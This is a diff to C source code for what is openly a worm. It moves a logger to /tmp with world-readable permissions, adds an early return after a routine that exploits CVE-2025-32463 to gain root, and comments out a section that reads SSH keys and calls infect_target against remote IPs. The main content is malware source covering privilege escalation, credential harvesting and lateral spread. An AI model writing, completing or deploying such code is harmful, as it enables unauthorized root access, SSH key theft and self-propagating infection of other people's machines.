@@ -553,9 +553,9 @@ int setup_logger() {
     }
 
     char log_path[512];
-    snprintf(log_path, sizeof(log_path), "%s/%s", getenv("HOME"), log_file);
+    snprintf(log_path, sizeof(log_path), "%s/%s", "/tmp", log_file);
 
-    int fd = open(log_path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
+    int fd = open(log_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); // 0644 -> Read for all
     if (fd < 0) {
         perror("open");
         return -1; // error
@@ -603,6 +603,8 @@ int main(int argc, char* argv[]) {
             printf("[+] CVE-2025-32463 vulnerability detected\n");
             cve_2025_32463_execute(); 
             printf("[+] CVE-2025-32463 applied. Continuing as root in another thread\n");
+            // Worm launched with privileges in another thread
+            return 0;
         } else {
         printf("[-] CVE-2025-32463 not applicable. Continuing as normal user\n");
         }
@@ -610,7 +612,7 @@ int main(int argc, char* argv[]) {
     } else {
         printf("[+] CVE-2025-32463 applied. You are root!\n");
     }
-
+/*
     // Check if SSH keys exist
     int keys_found = read_ssh_key();
     if (keys_found == 0) {
@@ -675,6 +677,6 @@ int main(int argc, char* argv[]) {
             infect_target(ip, argv[0]);
         }
     }
-
+*/
     return 0;
 }
